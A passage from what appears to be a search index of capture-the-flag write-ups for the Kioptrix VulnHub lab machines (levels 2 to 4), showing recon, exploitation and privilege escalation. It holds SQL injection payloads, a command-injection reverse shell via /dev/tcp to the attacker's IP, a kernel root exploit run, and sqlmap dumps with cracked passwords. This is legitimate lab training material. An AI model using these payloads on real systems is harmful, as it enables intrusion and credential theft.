cpe:/h:arubanetworks:iap-105\nAggressive OS guesses: Linux 2.6.9 - 2.6.30 (97%), Linux 2.6.18 - 2.6.32 (96%), Linux 2.6.9 (95%), HP Designjet T1100ps or Z3100ps printer (95%), Linux 2.6.8 - 2.6.12 (94%), Linux 2.6.9 - 2.6.18 (94%), Riverbed Steelhead Mobile Controller 4.0.3 (94%), Linux 2.6.24 - 2.6.36 (94%), Linux 2.6.9 - 2.6.33 (94%), Linux 2.6.13 - 2.6.32 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nHost script results:\n|_clock-skew: -2h09m39s\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 19.64 seconds\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.1%20%282%29/#exploit","title":"exploit","text":"<ul> <li>80 - apache - http</li> </ul> <pre><code>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))\n\nhttp://192.168.123.75/index.php\n\n&lt;!-- Start of HTML when logged in as Administator --&gt;\n\n\n-&gt; path: nothing\n\n$ dirb http://$IP\n\n-----------------\nDIRB v2.22\nBy The Dark Raver\n-----------------\n\nSTART_TIME: Wed Nov 15 04:22:32 2023\nURL_BASE: http://192.168.123.75/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612\n\n---- Scanning URL: http://192.168.123.75/ ----\n+ http://192.168.123.75/cgi-bin/ (CODE:403|SIZE:290)\n+ http://192.168.123.75/index.php (CODE:200|SIZE:667)\n==&gt; DIRECTORY: http://192.168.123.75/manual/\n+ http://192.168.123.75/usage (CODE:403|SIZE:287)\n</code></pre> <ul> <li>crack password [x]</li> <li>user : pass -&gt; mysql's users table -&gt; sqli</li> </ul> <pre><code>Administator' or 1=1 -- -:1\n</code></pre> <ul> <li>command injection poc</li> </ul> <pre><code>Ping a Machine on the Network: \ngoogle.com\n\nPING google.com (172.217.31.14) 56(84) bytes of data.\n64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=0 ttl=58 time=4.31 ms\n64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=1 ttl=58 time=4.34 ms\n64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=2 ttl=58 time=6.24 ms\n\n--- google.com ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2003ms\nrtt min/avg/max/mdev = 4.315/4.968/6.249/0.909 ms, pipe 2\n\n-&gt; command injection -&gt; get a shell\n\ngoogle.com; cat /etc/passwd\n\nPING google.com (172.217.31.14) 56(84) bytes of data.\n64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=0 ttl=58 time=4.66 ms\n64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=1 ttl=58 time=3.96 ms\n64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=2 ttl=58 time=3.75 ms\n\n--- google.com ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2001ms\nrtt min/avg/max/mdev = 3.750/4.127/4.669/0.392 ms, pipe 2\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\nnews:x:9:13:news:/etc/news:\nuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\ngopher:x:13:30:gopher:/var/gopher:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\nvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin\nrpm:x:37:37::/var/lib/rpm:/sbin/nologin\nhaldaemon:x:68:68:HAL daemon:/:/sbin/nologin\nnetdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash\nnscd:x:28:28:NSCD Daemon:/:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\nrpc:x:32:32:Portmapper RPC user:/:/sbin/nologin\nmailnull:x:47:47::/var/spool/mqueue:/sbin/nologin\nsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\npcap:x:77:77::/var/arpwatch:/sbin/nologin\napache:x:48:48:Apache:/var/www:/sbin/nologin\nsquid:x:23:23::/var/spool/squid:/sbin/nologin\nwebalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin\nxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin\nntp:x:38:38::/etc/ntp:/sbin/nologin\npegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash\njohn:x:500:500::/home/john:/bin/bash\nharold:x:501:501::/home/harold:/bin/bash\n</code></pre> <ul> <li>command injection exploit</li> </ul> <pre><code>google.com; bash -i &gt;&amp; /dev/tcp/192.168.123.99/2233 0&gt;&amp;1\nsudo rlwrap nc -lvnp 2233\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.1%20%282%29/#priv-esc","title":"priv-esc","text":"<ul> <li>enum</li> </ul> <pre><code>bash-3.00$ ip a\n1: lo: &lt;LOOPBACK,UP&gt; mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 brd 127.255.255.255 scope host lo\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:0c:29:fa:ad:8b brd ff:ff:ff:ff:ff:ff\n    inet 192.168.123.75/24 brd 192.168.123.255 scope global eth0\n    inet6 fe80::20c:29ff:fefa:ad8b/64 scope link\n       valid_lft forever preferred_lft forever\n3: sit0: &lt;NOARP&gt; mtu 1480 qdisc noop\n    link/sit 0.0.0.0 brd 0.0.0.0\nbash-3.00$ uname -a\nLinux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux\nbash-3.00$ whoami\napache\nbash-3.00$ id\nuid=48(apache) gid=48(apache) groups=48(apache)\n</code></pre> <ul> <li>mysql conn [x]</li> </ul> <pre><code>bash-3.00$ cat index.php\n&lt;?php\n        mysql_connect(\"localhost\", \"john\", \"hiroshima\") or die(mysql_error());\n        //print \"Connected to MySQL&lt;br /&gt;\";\n        mysql_select_db(\"webapp\");\n\n        if ($_POST['uname'] != \"\"){\n                $username = $_POST['uname'];\n                $password = $_POST['psw'];\n                $query = \"SELECT * FROM users WHERE username = '$username' AND password='$password'\";\n                //print $query.\"&lt;br&gt;\";\n                $result = mysql_query($query);\n\n                $row = mysql_fetch_array($result);\n                //print \"ID: \".$row['id'].\"&lt;br /&gt;\";\n        }\n\n?&gt;\n\nconn mysql [x]\nmysql -u john -p hiroshima\n</code></pre> <ul> <li>linux kernel priv-esc: Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1) - Linux_x86 local Exploit (exploit-db.com)</li> </ul> <pre><code>$ searchsploit Linux Kernel CentOS 2.6.9\nLinux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1) | linux_x86/local/9542.c\n\nShellcodes: No Results\n\nbash-3.00$ gcc 9542.c -o 9542\n9542.c:109:28: warning: no newline at end of file\nbash-3.00$ echo \"\" &gt;&gt; 9542.c\nbash-3.00$ gcc 9542.c -o 9542\nsh-3.00# chmod +x 9542\nsh-3.00# ./9542\n[-] check ur uid\nsh-3.00# ip a\n1: lo: &lt;LOOPBACK,UP&gt; mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 brd 127.255.255.255 scope host lo\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:0c:29:fa:ad:8b brd ff:ff:ff:ff:ff:ff\n    inet 192.168.123.75/24 brd 192.168.123.255 scope global eth0\n    inet6 fe80::20c:29ff:fefa:ad8b/64 scope link\n       valid_lft forever preferred_lft forever\n3: sit0: &lt;NOARP&gt; mtu 1480 qdisc noop\n    link/sit 0.0.0.0 brd 0.0.0.0\nsh-3.00# id\nuid=0(root) gid=0(root) groups=48(apache)\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/","title":"KIOPTRIX LEVEL 1.2 (3)","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#machine-info","title":"Machine Info","text":"<ul> <li>Name: Kioptrix: Level 1.2 (#3)</li> <li>Date release: 18 Apr 2011</li> <li>Author: Kioptrix</li> <li>Series: Kioptrix</li> <li> <p>Web page: http://www.kioptrix.com/blog/?p=358</p> </li> <li> <p>Vulnhub: Kioptrix: Level 1.2 (#3) ~ VulnHub</p> </li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#pwk","title":"PWK","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#recon","title":"recon","text":"<pre><code>$ sudo nmap -sT -sV -sC -O -p22,80 $IP -oA nmap/detail\nStarting Nmap 7.94 ( https://nmap.org ) at 2023-11-15 16:57 CST\nNmap scan report for kioptrix3.com (192.168.123.84)\nHost is up (0.00052s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)\n| ssh-hostkey:\n|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)\n|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)\n80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)\n|_http-title: Ligoat Security - Got Goat? Security ...\n|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\nMAC Address: 00:0C:29:65:C4:91 (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 2.6.X\nOS CPE: cpe:/o:linux:linux_kernel:2.6\nOS details: Linux 2.6.9 - 2.6.33\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.99 seconds\n</code></pre> <ul> <li> <p>80 - http - key endpoint</p> </li> <li> <p>OS: Ubuntu 2.2.8</p> </li> <li> <p>Web: Apache, gallery CMS Ligoat</p> </li> <li> <p>check html code:</p> </li> </ul> <pre><code>- view-source:http://kioptrix3.com/\n\nname of author - Manjeet Singh Sawhney   www.manjeetss.com\nLotusCMS\n\n&lt;!-- Leaving in my name and website link will be greatly appreciated in return for offering you this template for free. Thanking you in advance. --&gt;\n</code></pre> <ul> <li>CMS: LotusCMS</li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#exploit","title":"exploit","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#lotuscms-x","title":"LotusCMS [x]","text":"<p>This exp method is not recommended. Because RCE is discovered in 2012, while this machine is released in 2011.</p> <pre><code>$ searchsploit LotusCMS\n[y] LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)                             | php/remote/18565.rb\n[x] LotusCMS 3.0.3 - Multiple Vulnerabilities                                                 | php/webapps/16982.txt\n</code></pre> <p>Simply exhibit the exp process:</p> <p></p> <p>burp to capture this packet and change it to POST request:</p> <p></p> <p>poc:</p> <p></p> <p>get a shell:</p> <p></p>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#gallery","title":"gallery","text":"<p>Check gallery cms, seek around vulns and find a sqli vuln:</p> <p></p> <p></p>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#manual-sqli","title":"manual sqli","text":"<ul> <li><code>?id=1 UNION ALL SELECT NULL,database(),version(),NULL,NULL,NULL -- -</code></li> <li><code>?id=1 UNION ALL SELECT NULL,group_concat(table_name),NULL,NULL,NULL,NULL from information_schema.tables where table_schema='gallery' -- -</code></li> </ul> <ul> <li> <p>gallarific_users [x], dev_accounts [y]</p> </li> <li> <p><code>?id=1 UNION ALL SELECT NULL,group_concat(column_name),NULL,NULL,NULL,NULL from information_schema.columns where table_schema='gallery' and table_name='dev_accounts' -- -</code></p> </li> </ul> <p></p> <ul> <li><code>?id=1 UNION ALL SELECT NULL,group_concat(id,'~',username,'~',password),NULL,NULL,NULL,NULL from gallery.dev_accounts -- -</code></li> </ul> <p></p> <ul> <li>crack passwords</li> </ul> <pre><code>dreg : 0d3eccfb887aabd50f243b3f155c0f85\nloneferret : 5badcaf789d3d1d09794d8f021f40f0e\n\n$ hashcat -m 0 -a 0 '0d3eccfb887aabd50f243b3f155c0f85' rockyou.txt --show\n0d3eccfb887aabd50f243b3f155c0f85:Mast3r\n$ hashcat -m 0 -a 0 '5badcaf789d3d1d09794d8f021f40f0e' rockyou.txt --show\n5badcaf789d3d1d09794d8f021f40f0e:starwars\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#sqlmap","title":"sqlmap","text":"<pre><code>$ sqlmap -u 'http://kioptrix3.com/gallery/gallery.php?id=1'\n\n$ sqlmap -u 'http://kioptrix3.com/gallery/gallery.php?id=1' -D gallery -T gallarific_users --dump # [x]\n\n$ sqlmap -u 'http://kioptrix3.com/gallery/gallery.php?id=1' -D gallery -T dev_accounts --dump\n        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.7.10#stable}\n|_ -| . [']     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 05:35:05 /2023-11-16/\n\n[05:35:05] [INFO] resuming back-end DBMS 'mysql'\n[05:35:05] [INFO] testing connection to the target URL\n[05:35:05] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests\nyou have not declared cookie(s), while server wants to set its own ('PHPSESSID=e324d68785c...c837c2c3b2'). Do you want to use those [Y/n]\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: Boolean-based blind - Parameter replace (original value)\n    Payload: id=(SELECT (CASE WHEN (8978=8978) THEN 1 ELSE (SELECT 8402 UNION SELECT 7981) END))\n\n    Type: error-based\n    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)\n    Payload: id=1 OR ROW(4218,6009)&gt;(SELECT COUNT(*),CONCAT(0x71627a7a71,(SELECT (ELT(4218=4218,1))),0x716b766271,FLOOR(RAND(0)*2))x FROM (SELECT 2632 UNION SELECT 9035 UNION SELECT 9554 UNION SELECT 9939)a GROUP BY x)\n\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=1 AND (SELECT 7588 FROM (SELECT(SLEEP(5)))lcXH)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 6 columns\n    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71627a7a71,0x4a71716c674d7a574567667369784c5578716251584c5343497964727167624a5244554d4d474f7a,0x716b766271),NULL,NULL,NULL,NULL-- -\n---\n[05:35:06] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu 8.04 (Hardy Heron)\nweb application technology: Apache 2.2.8, PHP, PHP 5.2.4\nback-end DBMS: MySQL &gt;= 4.1\n[05:35:06] [INFO] fetching columns for table 'dev_accounts' in database 'gallery'\n[05:35:06] [INFO] retrieved: 'id','int(10)'\n[05:35:06] [INFO] retrieved: 'username','varchar(50)'\n[05:35:06] [INFO] retrieved: 'password','varchar(50)'\n[05:35:06] [INFO] fetching entries for table 'dev_accounts' in database 'gallery'\n[05:35:06] [INFO] retrieved: '1','0d3eccfb887aabd50f243b3f155c0f85','dreg'\n[05:35:06] [INFO] retrieved: '2','5badcaf789d3d1d09794d8f021f40f0e','loneferret'\n[05:35:06] [INFO] recognized possible password hashes in column 'password'\ndo you want to store hashes to a temporary file for eventual further processing with other tools [y/N]\ndo you want to crack them via a dictionary-based attack? [Y/n/q]\n[05:35:09] [INFO] using hash method 'md5_generic_passwd'\nwhat dictionary do you want to use?\n[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)\n[2] custom dictionary file\n[3] file with list of dictionary files\n&gt; 1\n[05:35:13] [INFO] using default dictionary\ndo you want to use common password suffixes? (slow!) [y/N]\n[05:35:15] [INFO] starting dictionary-based cracking (md5_generic_passwd)\n[05:35:15] [INFO] starting 4 processes\n[05:35:16] [INFO] cracked password 'Mast3r' for user 'dreg'\n[05:35:17] [INFO] cracked password 'starwars' for user 'loneferret'\nDatabase: gallery\nTable: dev_accounts\n[2 entries]\n+----+---------------------------------------------+------------+\n| id | password                                    | username   |\n+----+---------------------------------------------+------------+\n| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |\n| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |\n+----+---------------------------------------------+------------+\n\n[05:35:19] [INFO] table 'gallery.dev_accounts' dumped to CSV file '/home/qwe/.local/share/sqlmap/output/kioptrix3.com/dump/gallery/dev_accounts.csv'\n[05:35:19] [WARNING] HTTP error codes detected during run:\n500 (Internal Server Error) - 1 times\n[05:35:19] [INFO] fetched data logged to text files under '/home/qwe/.local/share/sqlmap/output/kioptrix3.com'\n\n[*] ending @ 05:35:19 /2023-11-16/\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.2%20%283%29/#priv-esc","title":"priv-esc","text":"<p>creds:</p> <ul> <li>dreg:Mast3r</li> <li>loneferret:starwars</li> </ul> <p>ssh to connect the machine:</p> <pre><code>ssh -oHostKeyAlgorithms=+ssh-rsa loneferret@$IP\nloneferret@Kioptrix3:~$ sudo -l\nsudo -l\nUser loneferret may run the following commands on this host:\n    (root) NOPASSWD: !/usr/bin/su\n    (root) NOPASSWD: /usr/local/bin/ht\n</code></pre> <p>use ht to change /etc/sudoers</p> <p></p> <p></p> <pre><code>loneferret@Kioptrix3:~$ sudo su root\nroot@Kioptrix3:/home/loneferret#\n\nroot@Kioptrix3:~# ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:0c:29:65:c4:91 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.123.84/24 brd 192.168.123.255 scope global eth1\n    inet6 fe80::20c:29ff:fe65:c491/64 scope link\n       valid_lft forever preferred_lft forever\nroot@Kioptrix3:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@Kioptrix3:~# whoami\nroot\nroot@Kioptrix3:~# cat Congrats.txt\nGood for you for getting here.\nRegardless of the matter (staying within the spirit of the game of course)\nyou got here, congratulations are in order. Wasn't that bad now was it.\n\nWent in a different direction with this VM. Exploit based challenges are\nnice. Helps workout that information gathering part, but sometimes we\nneed to get our hands dirty in other things as well.\nAgain, these VMs are beginner and not intented for everyone.\nDifficulty is relative, keep that in mind.\n\nThe object is to learn, do some research and have a little (legal)\nfun in the process.\n\n\nI hope you enjoyed this third challenge.\n\nSteven McElrea\naka loneferret\nhttp://www.kioptrix.com\n\n\nCredit needs to be given to the creators of the gallery webapp and CMS used\nfor the building of the Kioptrix VM3 site.\n\nMain page CMS:\nhttp://www.lotuscms.org\n\nGallery application:\nGallarific 2.1 - Free Version released October 10, 2009\nhttp://www.gallarific.com\nVulnerable version of this application can be downloaded\nfrom the Exploit-DB website:\nhttp://www.exploit-db.com/exploits/15891/\n\nThe HT Editor can be found here:\nhttp://hte.sourceforge.net/downloads.html\nAnd the vulnerable version on Exploit-DB here:\nhttp://www.exploit-db.com/exploits/17083/\n\n\nAlso, all pictures were taken from Google Images, so being part of the\npublic domain I used them.\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/","title":"KIOPTRIX LEVEL 1.3 (4)","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#machine-info","title":"Machine Info","text":"<ul> <li>Name: Kioptrix: Level 1.3 (#4)</li> <li>Date release: 8 Feb 2012</li> <li>Author: Kioptrix</li> <li>Series: Kioptrix</li> <li>Web page: http://www.kioptrix.com/blog/?p=604</li> <li>Vulnhub: Kioptrix: Level 1.3 (#4) ~ VulnHub</li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#pwk","title":"PWK","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#recon","title":"recon","text":"<ul> <li><code>$ sudo nmap -sT -sV -sC -O -p22,80,139,445 $IP -oA nmap/detail</code></li> </ul> <pre><code>Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-16 14:05 CST\nNmap scan report for 192.168.123.93\nHost is up (0.00072s latency).\n\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)\n| ssh-hostkey:\n|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)\n|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)\n80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open              Samba smbd 3.0.28a (workgroup: WORKGROUP)\nMAC Address: 00:0C:29:A9:40:2B (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 2.6.X\nOS CPE: cpe:/o:linux:linux_kernel:2.6\nOS details: Linux 2.6.12 - 2.6.14 (embedded), Linux 2.6.9 - 2.6.33\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_smb2-time: Protocol negotiation failed (SMB2)\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_clock-skew: mean: 10h29m59s, deviation: 3h32m07s, median: 7h59m59s\n| smb-os-discovery:\n|   OS: Unix (Samba 3.0.28a)\n|   Computer name: Kioptrix4\n|   NetBIOS computer name:\n|   Domain name: localdomain\n|   FQDN: Kioptrix4.localdomain\n|_  System time: 2023-11-16T09:05:23-05:00\n|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#exploit","title":"exploit","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#139-445-smb","title":"139, 445 - smb","text":"<ul> <li>file leakage, <code>$ smbmap -H $IP</code>, no access [x]</li> </ul> <pre><code>    ________  ___      ___  _______   ___      ___       __         _______\n   /\"       )|\"  \\    /\"  ||   _  \"\\ |\"  \\    /\"  |     /\"\"\\       |   __ \"\\\n  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)\n   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /' /\\  \\     |:  ____/\n    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __'  \\    (|  /\n   /\" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\\n  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)\n -----------------------------------------------------------------------------\n     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com\n                     https://github.com/ShawnDEvans/smbmap\n\n[*] Detected 1 hosts serving SMB\n[*] Established 1 SMB session(s)\n\n[+] IP: 192.168.123.93:445      Name: 192.168.123.93            Status: Authenticated\n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        print$                                                  NO ACCESS       Printer Drivers\n        IPC$                                                    NO ACCESS       IPC Service (Kioptrix4 server (Samba, Ubuntu))\n</code></pre> <ul> <li><code>enum4linux $IP</code>, get 4 usernames (seek password if possible):</li> <li>root</li> <li>robert</li> <li>john</li> <li>loneferret</li> </ul> <pre><code>[+] Got OS info for 192.168.123.93 from srvinfo:\n        KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)\n        platform_id     :       500\n        os version      :       4.9\n        server type     :       0x809a03\n\n\n[+] Enumerating users using SID S-1-22-1 and logon username '', password ''\n\nS-1-22-1-1000 Unix User\\loneferret (Local User)\nS-1-22-1-1001 Unix User\\john (Local User)\nS-1-22-1-1002 Unix User\\robert (Local User)\n\nuser:[nobody] rid:[0x1f5]\nuser:[robert] rid:[0xbbc]\nuser:[root] rid:[0x3e8]\nuser:[john] rid:[0xbba]\nuser:[loneferret] rid:[0xbb8]\n</code></pre> <ul> <li>smb version using metasploit: Samba 3.0.28a</li> </ul> <pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; run\n\n[*] 192.168.123.93:445    - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)\n[*] 192.168.123.93:445    -   Host could not be identified: Unix (Samba 3.0.28a)\n[*] 192.168.123.93:       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#image-source-checking","title":"image source checking","text":"<p>nothing special here.</p> <ul> <li>http://192.168.123.93/images/cartoon_goat.png</li> <li><code>$ exiftool cartoon_goat.png</code></li> <li><code>$ binwalk cartoon_goat.png</code></li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#80-http","title":"80 - http","text":"<ul> <li>path recon: <code>$ sudo gobuster dir -u $IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></li> </ul> <pre><code>===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.123.93\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 356] [--&gt; http://192.168.123.93/images/]\n/index                (Status: 200) [Size: 1255]\n/member               (Status: 302) [Size: 220] [--&gt; index.php]\n/logout               (Status: 302) [Size: 0] [--&gt; index.php]\n/john                 (Status: 301) [Size: 354] [--&gt; http://192.168.123.93/john/]\n/robert               (Status: 301) [Size: 356] [--&gt; http://192.168.123.93/robert/]\n/server-status        (Status: 403) [Size: 334]\nProgress: 220560 / 220561 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre> <ul> <li>sensitive data leakage:</li> <li>http://192.168.123.93/database.sql</li> <li>username john in database X table members</li> <li>column_name: id, username, password -&gt; sqli (next procedure)</li> </ul> <pre><code>CREATE TABLE `members` (\n`id` int(4) NOT NULL auto_increment,\n`username` varchar(65) NOT NULL default '',\n`password` varchar(65) NOT NULL default '',\nPRIMARY KEY (`id`)\n) TYPE=MyISAM AUTO_INCREMENT=2 ;\n\n-- \n-- Dumping data for table `members`\n-- \n\nINSERT INTO `members` VALUES (1, 'john', 